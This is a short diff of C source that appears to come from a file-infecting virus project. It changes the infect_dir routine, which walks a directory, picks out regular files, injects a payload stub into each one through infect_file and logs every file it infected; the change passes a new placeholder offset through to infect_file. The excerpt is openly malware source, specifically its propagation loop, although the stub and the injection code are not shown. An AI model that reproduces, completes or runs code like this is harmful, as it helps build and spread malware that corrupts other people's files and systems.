@@ -30,7 +30,7 @@ static int join_path(char *buf, size_t size, const char *dir, const char *name)
 	return (0);
 }
 
-void infect_dir(const char *dir, const unsigned char *stub, size_t stub_len)
+void infect_dir(const char *dir, const unsigned char *stub, size_t stub_len, size_t placeholders_offset)
 {
 	struct my_DIR			d;
 	struct linux_dirent64	*ent;
@@ -46,7 +46,7 @@ void infect_dir(const char *dir, const unsigned char *stub, size_t stub_len)
 			continue ;
 		if (!is_regular(path, ent))
 			continue ;
-		infect_file(path, stub, stub_len);
+		infect_file(path, stub, stub_len, placeholders_offset);
 		LOG("infected file: %s\n", path);
 	}
 	closedir(&d);
